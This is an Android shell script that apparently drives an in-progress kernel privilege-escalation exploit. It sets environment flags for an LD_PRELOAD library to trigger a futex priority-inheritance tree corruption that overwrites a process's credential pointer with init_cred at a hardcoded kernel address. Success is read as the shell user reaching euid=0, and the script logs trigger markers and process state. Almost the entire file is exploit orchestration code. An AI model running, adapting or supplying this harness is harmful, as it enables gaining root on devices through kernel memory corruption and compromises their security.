#!/system/bin/sh
# E4a: pi_tree geometry ISOLATION test (mt72, 2026-09-02)
#
# What: fork mode (fresh child), PSELECT_PTR_PI=1 — the PI tree erase writes
#   *(task+0x780) = init_cred (cred pointer) while real_cred stays original.
#   Main tree is harmlesss (pc=fake_lock zero region, right=left=0).
# Why: bypass the C-stage paradox (CHECKPOINT_C_stage_paradox_20260901.md):
#   C main-tree geometry is instruction-proven to write 0x780 yet never lands
#   empirically (0/N). E4 uses the pi_tree child-color store instead.
#
# Success: mt49_child_status.txt shows "euid=0" with "CapEff=0000000000000000"
#   (half state — STRICT AND-gate needs BOTH, so no setresuid/commit_creds,
#   structurally safe).
# Failure: euid=2000 unchanged (pi geometry also blocked -> H2 upstream).
#
# E2 forensics included: 1s sampler of all sleep-180 pids (comm/state) plus
#   the child status file; everything collected into the log at the end.
#
# Run via rish/Shizuku after deploying mt72 preload.so.
NAME=E4a
LOG=/data/local/tmp/${NAME}_log.txt
SNAP=/data/local/tmp/${NAME}_snap.txt
echo "=== E4a PI-isolation start $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) ===" > $LOG
# 2026-09-03: load gate — refuse to fire while 1-min loadavg > 10.
# Starvation is self-induced by heavy D-state work under load; running
# during high load only wastes rounds and can cause soft-restart storms.
LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
LOAD_INT=${LOAD%.*}
if [ "${LOAD_INT:-0}" -gt 10 ]; then
  echo "load gate: 1-min loadavg=$LOAD >10, refuse to run; wait for recovery"
  exit 2
fi

am kill-all 2>/dev/null
rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt /data/local/tmp/${NAME}.out $SNAP

# E2 sampler: 1s snapshots — child comm/state + full status-file history.
(while :; do
  for p in $(pgrep -f "sleep 180" 2>/dev/null); do
    echo "$(date +%H:%M:%S) pid=$p comm=$(cat /proc/$p/comm 2>/dev/null) state=$(cut -d' ' -f3 /proc/$p/stat 2>/dev/null) $(cat /data/local/tmp/mt49_child_status.txt 2>/dev/null)"
  done
  sleep 1
done) > $SNAP 2>&1 &
SAMPLER=$!

timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_PI=1 \
  PSELECT_PTR_VALUE=ffffff80027b0ae0 \
  PSELECT_PTR_STRICT=1 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
  > /data/local/tmp/${NAME}.out 2>&1
RC=$?
kill $SAMPLER 2>/dev/null

echo "E4a rc=$RC enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "--- final child status ---" >> $LOG
cat /data/local/tmp/mt49_child_status.txt 2>/dev/null >> $LOG
echo "--- root_alive ---" >> $LOG
cat /data/local/tmp/root_alive.txt 2>/dev/null >> $LOG
echo "--- E4a markers ---" >> $LOG
grep -a "mt33: child pid\|mt72: PI-write\|mt51:\|mt66:\|mt25: futex trigger\|mt19b\|pselect returned\|mt47: ROOT-SEEN\|euid=0\|mt61: pselect window\|mt59: STALL" /data/local/tmp/${NAME}.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -40 >> $LOG
echo "--- E2 sampler tail (last 30 lines) ---" >> $LOG
tail -30 $SNAP >> $LOG 2>/dev/null
cat $LOG
